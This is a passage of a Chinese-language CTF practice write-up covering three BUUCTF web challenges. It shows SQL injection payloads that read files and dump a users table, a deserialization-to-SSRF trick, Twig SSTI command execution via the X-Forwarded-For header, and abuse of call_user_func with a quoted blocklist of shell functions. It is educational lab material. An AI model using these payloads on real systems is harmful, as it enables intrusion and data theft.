invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过 get 获取 url，设置 curl 参数，将指定的 url 内容返回，内容不是 404 就可以返回</p>
<blockquote>
<p><code>curl_setopt (int ch, string option, mixed value)</code></p>
<p>curl_setopt () 函数将为一个 CURL 会话设置选项。option 参数是你想要的设置，value 是这个选项给定的值。</p>
<p><code>curl_getinfo()</code>  —— 获取一个 cURL 连接资源句柄的信息</p>
</blockquote>
<p>最后还对 blog 正则匹配</p>
<p>回到题目，先注册一下看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a06.png" alt></p>
<p>注册完后可以发现 admin 是可以点击的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a07.png" alt></p>
<p>点击进去查看网页源代码发现他是可以回显 blog 里的内容</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a08.png" alt></p>
<p>这个 base64 解码之后会发现很多百度相关的元素，比如百度一下，你就知道这种 title，这个 src 用的是 data 协议，在做 php 伪协议的题目也有用来读取 flag</p>
<p>仔细看 url，其实可以发现类似 sql 注入常用的 id 参数，这里是 no</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://781fc949-b9d2-4223-9f55-8d9fed53a21a.node5.buuoj.cn:81/view.php?no=1</span><br></pre></td></tr></table></figure>
<p>尝试一下 sql 注入</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a09.png" alt></p>
<p>加个单引号可以发现有回显错误</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a10.png" alt></p>
<p>发现本题不需要再去闭合符号，order by 查字段数，在查询到 5 的时候出错了，说明有 4 个字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0 order by 5#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a11.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a12.png" alt></p>
<p>用联合注入看看回显字段，用 /**/ 替换空格，不替换的话会显示 <code>no hack ~_~</code></p>
<p><code>/**/</code>  可以绕过检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,2,3,4#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a13.png" alt></p>
<p>回显字段是 2，获取当前数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,database(),3,4#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a14.png" alt></p>
<p>查询用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,user(),3,4#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a21.png" alt></p>
<p><strong>解法 1：</strong></p>
<p>mysql 中的 load_file () 函数可以访问系统内任意文件，可以将内容以字符串形式返回，而且不用很高的权限，但是需要绝对路径，绝对路径在扫描的时候是有发现 flag.php 的文件，而且上面在尝试 sql 注入的时候是有发现绝对路径 <code>/var/www/html/view.php</code> ，flag.php 在扫描的时候发现适合 view.php 同一个目录下，所以 flag.php 的绝对路径应该就是 <code>/var/www/html/flag.php</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4#</span><br></pre></td></tr></table></figure>
<p>查看源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a22.png" alt></p>
<p eb9fe07c-caaf-49e4-9eea-693ce10b8514>拿到 flag，flag</p>
<p><strong>解法 2：</strong></p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;fakebook&#x27;#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a15.png" alt></p>
<p>表名 users</p>
<p>爆字段</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a16.png" alt></p>
<p>得到四个字段名 no,username,passwd,data</p>
<p>爆出 username,passwd,data</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,group_concat(username,passwd,data),3,4/**/from/**/users#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a17.png" alt></p>
<p>data 内容为 <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</code></p>
<p>这是一个 UserInfo 对象序列化后，如果 select 把这个内容传回去会出现什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;&#x27;from users#</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a18.png" alt></p>
<p>直接是回显了 blog 的内容，尝试构造一个反序列化的内容去获取 flag，在扫描的时候是有发现 flag.php 的文件，而且上面在尝试 sql 注入的时候是有发现绝对路径 <code>/var/www/html/view.php</code> ，flag.php 在扫描的时候发现适合 view.php 同一个目录下</p>
<p>payload（注意 s 后面的数字是 29，改了参数大小不能不改）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;from users#</span><br></pre></td></tr></table></figure>
<p>f12 查看内容，base64 解码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a19.png" alt></p>
<p eb9fe07c-caaf-49e4-9eea-693ce10b8514>得到 flag，flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a20.png" alt></p>
<h2 id="bjdctf2020the-mystery-of-ip"><a class="markdownIt-Anchor" href="#bjdctf2020the-mystery-of-ip">#</a> [BJDCTF2020]The mystery of ip</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a23.png" alt></p>
<p>在 flag 页面发现 ip 地址，题目名称叫 ip 的秘密，看了大佬们的 wp 发现是存在 <code>X-Forwarded-For</code>  注入</p>
<p>抓包，添加 XFF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a24.png" alt></p>
<p>可以看到 ip 被修改为 1，说明 XFF 是可控的</p>
<p>这里做个记录</p>
<blockquote>
<p>SSTI 漏洞</p>
<p>1.php 常用的</p>
<p>Smarty：Smarty 算是一种很老的 PHP 模板引擎了，非常的经典，使用的比较广泛</p>
<p>Twig：Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。</p>
<p>Blade：Blade 是 Laravel 提供的一个既简单又强大的模板引擎。和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p>
<p>2.Java 常用的</p>
<p>JSP：这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p>
<p>FreeMarker：FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML 网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户的，而是一个 Java 类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p>Velocity：Velocity 作为历史悠久的模板引擎不单单可以替代 JSP 作为 JavaWeb 的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p>
<p>3.Python 常用的</p>
<p>Jinja2：flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p>
<p>django：django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的 ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p>
<p>tornado：tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p>
</blockquote>
<p>看别的师傅的 wp，这题相关的应该是下面两个</p>
<blockquote>
<p>1、Flask 可能存在 Jinjia2 模版注入漏洞</p>
<p>Flask 是一个很常用的 python 框架，其中存在 SSTI 漏洞。</p>
<p>SSTI，服务端模板注入，很早就知道这个东西，但没有仔细整理过，作为一种注入漏洞，简单说就是用户的说明会变成命令执行，比如 <code>&#123;&#123;7*7&#125;&#125;</code>  会变成 49。</p>
<p>模板：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">templeta = &quot;hello&quot; + &#123;&#123;user,id&#125;&#125;</span><br><span class="line">render(templeta)</span><br></pre></td></tr></table></figure>
<p>这里大括号里的东西是可变的，而当用户传入某些参数时系统可能会把用户的参数当成代码执行，例如 <code>&#123;&#123;7*7&#125;&#125;</code>  在执行时就会变成 49，这就存在漏洞。进一步，既然存在注入那肯定可以试着去执行系统命令，诸如 <code>&#123;&#123;os.system('ls')&#125;&#125;</code>  等等，继而引发各种问题。</p>
<p>2、PHP 可能存在 Twig 模版注入漏洞</p>
<p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了  <code>range()</code>  函数用来返回一个包含整数等差数列的列表：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="function"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title">range</span>(<span class="params"><span class="number">0</span>, <span class="number">3</span></span>) %&#125;</span></span><br><span class="line">&#123;&#123; i &#125;&#125;,</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">// Output: 0, 1, 2, 3</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>那这里尝试添加模板的算式，看看是否存在注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;9*9&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a25.png" alt></p>
<p>确实存在漏洞，尝试是否能执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a26.png" alt></p>
<p>尝试获取查找 flag 的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a27.png" alt></p>
<p>可以看到在 <code>/</code>  目录下存在 flag，尝试读取 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a28.png" alt></p>
<p 1f0cefd1-345d-4793-9d46-4b77250e6041>得到 flag，flag</p>
<h2 id="网鼎杯-2020-朱雀组phpweb"><a class="markdownIt-Anchor" href="#网鼎杯-2020-朱雀组phpweb">#</a> [网鼎杯 2020 朱雀组] phpweb</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a29.png" alt></p>
<p>题目进来一直在刷新，f12 也没什么收获，抓个包看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a30.png" alt></p>
<p>抓包后可以发现以 POST 方式提交了两个参数一个是 func 一个是 p，func=date，p 是日期的格式，页面也一直回显这个形式的时间，func 又是常用的自定义函数名，验证一下二者是否有关系，可以使用 md5 () 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=md5&amp;p=123</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a31.png" alt></p>
<p>可以发现回显内容已经变成了 md5 加密的 123，这里可以尝试使用命令了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=system&amp;p=&#x27;ls&#x27;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a32.png" alt></p>
<p>存在过滤，那可以尝试一下读取源码，可以使用多种函数进行查看，比如说：file_get_contents ()、highlight_file () ，show_source () 等</p>
<p>这里使用 file_get_contents () 函数</p>
<blockquote>
<p>file_get_contents (path): 读取 path 路径下文件的内容</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == 